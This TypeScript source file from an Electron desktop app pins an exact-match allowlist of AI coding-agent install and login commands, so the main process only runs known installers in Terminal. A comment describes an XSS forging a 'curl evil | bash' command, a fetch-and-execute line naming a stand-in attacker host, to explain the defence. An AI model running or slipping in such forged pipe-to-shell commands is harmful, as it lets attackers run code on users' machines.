// ──────────────────────────────────────────────────────────
// Canonical agent CLI install commands (single source of truth)
// ──────────────────────────────────────────────────────────
//
// These are the BUNDLED, trusted install one-liners shown in the providers
// panel. They are also the EXACT-MATCH allowlist enforced by Electron-main's
// `open_install_terminal` (apps/desktop/electron/ipc/commands/shell.ts): the renderer hands
// a command string up to be run in Terminal.app, and main only runs it if it is
// one of these. The character allowlist alone cannot help,
// because a legit installer is itself `curl … | bash`, so an XSS could forge a
// `curl evil | bash` that passes the character check. Pinning to this set means
// a forged command is rejected.
//
// Keep this in sync with apps/desktop/src/engine/agents/registry.ts (which imports it).
// ──────────────────────────────────────────────────────────

export const AGENT_INSTALL_COMMANDS = {
  claude: "npm install -g @anthropic-ai/claude-code",
  codex: "npm install -g @openai/codex",
  cursor: "curl https://cursor.com/install -sSf | bash",
} as const;

const INSTALL_COMMAND_SET = new Set<string>(
  Object.values(AGENT_INSTALL_COMMANDS),
);

const LOGIN_BY_INSTALL = new Map<string, string>([
  [AGENT_INSTALL_COMMANDS.claude, "claude /login"],
  [AGENT_INSTALL_COMMANDS.codex, "codex login"],
  [AGENT_INSTALL_COMMANDS.cursor, "cursor-agent login"],
]);

/** Return only a bundled login command paired with its own installer. */
export function trustedInstallLogin(install: string, requested: unknown): string {
  const login = LOGIN_BY_INSTALL.get(install);
  if (!login || requested !== login) throw new Error("login command does not match the recognized agent installer");
  return login;
}

/** True when `cmd` is exactly one of the bundled, trusted install commands. */
export function isKnownInstallCommand(cmd: string): boolean {
  return INSTALL_COMMAND_SET.has(cmd);
}
